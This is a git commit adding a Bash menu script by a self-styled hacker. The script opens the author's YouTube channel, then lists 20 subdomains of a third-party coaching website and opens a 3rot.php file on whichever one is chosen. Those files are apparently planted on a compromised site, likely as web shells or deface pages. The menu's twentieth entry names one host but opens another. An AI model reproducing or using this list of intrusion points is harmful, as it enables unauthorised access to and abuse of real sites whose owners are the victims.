a73fcb3864a8076f80b3bed824b8b5f623ca5129
MrVirusSpm-07 <81134812+MrVirusSpm-07@users.noreply.github.com>
2021-05-23 03:02:18 +0700

    Add files via upload

---
+++ sc-pepes.sh
@@ -0,0 +1,176 @@
+
+
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+clear
+echo
+echo $green
+    sleep 1
+          xdg-open https://youtube.com/channel/UCJcJ5ZARYowKSZzgPWSxpcQ
+echo " __  __ ______     _____ ____  _   _ ____ ____  ____  __  __ "
+echo "|  \/  |  _ \ \   / /_ _|  _ \| | | / ___/ ___||  _ \|  \/  |"
+echo "| |\/| | |_) \ \ / / | || |_) | | | \___ \___ \| |_) | |\/| |"
+echo "| |  | |  _ < \ V /  | ||  _ <| |_| |___) |__) |  __/| |  | |"
+echo "|_|  |_|_| \_\ \_/  |___|_| \_\\___/|____/____/|_|   |_|  |_|"
+    sleep 2
+        echo
+            echo $red"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+            echo $red"x     "$ehite"SCRIPT BY MR VIRUS SPM       "$red"x"
+            echo $red"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+        echo
+    sleep 1
+echo $white"PEPES BY MANG ASEP IT GANZ BANGET ANJIR"
+echo $red"========================================="
+    echo
+        echo
+echo $purple"01)." $yellow"adrien.philipp-webcoaching"
+echo $purple"02)." $yellow"agassi.v.philipp-webcoaching"
+echo $purple"03)." $yellow"alex.M.philipp-webcoaching"
+echo $purple"04)." $yellow"aline.philipp-webcoaching"
+echo $purple"05)." $yellow"amaury.c.philipp-webcoaching"
+echo $purple"06)." $yellow"anaita.s.philipp-webcoaching"
+echo $purple"07)." $yellow"antonin.g.philipp-webcoaching"
+echo $purple"08)." $yellow"artur.philipp-webcoaching"
+echo $purple"09)." $yellow"axel.m.philipp-webcoaching"
+echo $purple"10)." $yellow"baris.philipp-webcoaching"
+echo $purple"11)." $yellow"benjamin.n.philipp-webcoaching"
+echo $purple"12)." $yellow"benjamin.s.philipp-webcoaching"
+echo $purple"13)." $yellow"camille.F.philipp-webcoaching"
+echo $purple"14)." $yellow"charles.g.philipp-webcoaching"
+echo $purple"15)." $yellow"claire.c.philipp-webcoaching"
+echo $purple"16)." $yellow"clement.c.philipp-webcoaching"
+echo $purple"17)." $yellow"clement.l.philipp-webcoaching"
+echo $purple"18)." $yellow"clementine.m.philipp-webcoaching"
+echo $purple"19)." $yellow"coline.m.philipp-webcoaching"
+echo $purple"20)." $yellow"demondrc22.philipp-webcoaching"
+    echo
+      echo
+        echo
+sleep 2
+read -p "NOMOR ? =========>  " hat
+if [ $hat = 1 ] || [ $hat = 01 ]
+then
+clear 
+sleep 2
+       xdg-open http://adrien.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 2 ] || [ $hat = 02 ]
+then
+clear
+sleep 2
+      xdg-open http://agassi.v.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 3 ] || [ $hat = 03 ]
+then
+clear
+sleep 2
+      xdg-open http://alex.M.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 4 ] || [ $hat = 04 ]
+then
+clear
+sleep 2
+      xdg-open http://aline.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 5 ] || [ $hat = 05 ]
+then
+clear
+sleep 2
+      xdg-open http://amaury.c.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 6 ] || [ $hat = 06 ]
+then
+clear
+sleep 2
+      xdg-open http://anaita.s.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 7 ] || [ $hat = 07 ]
+then
+clear
+sleep 2
+      xdg-open http://antonin.g.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 8 ] || [ $hat = 08 ]
+then
+clear
+sleep 2
+      xdg-open http://artur.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 9 ] || [ $hat = 09 ]
+then
+clear
+sleep 2
+      xdg-open http://axel.m.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 10 ]
+then
+clear
+sleep 2
+      xdg-open http://baris.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 11 ]
+then
+clear
+sleep 2
+      xdg-open http://benjamin.n.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 12 ]
+then
+clear
+sleep 2
+      xdg-open http://benjamin.s.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 13 ]
+then
+clear
+sleep 2
+      xdg-open http://camille.F.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 14 ]
+then
+clear
+sleep 2
+      xdg-open http://charles.g.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 15 ]
+then
+clear
+sleep 2
+      xdg-open http://claire.c.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 16 ]
+then
+clear
+sleep 2
+      xdg-open http://clement.c.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 17 ]
+then
+clear
+sleep 2
+      xdg-open http://clement.l.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 18 ]
+then
+clear
+sleep 2
+      xdg-open http://clementine.m.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 19 ]
+then
+clear
+sleep 2
+      xdg-open http://coline.m.philipp-webcoaching.fr/3rot.php
+fi
+if [ $hat = 20 ]
+then
+clear
+sleep 2
+      xdg-open http://delphine.pcweb-conseils.com/3rot.php
+fi
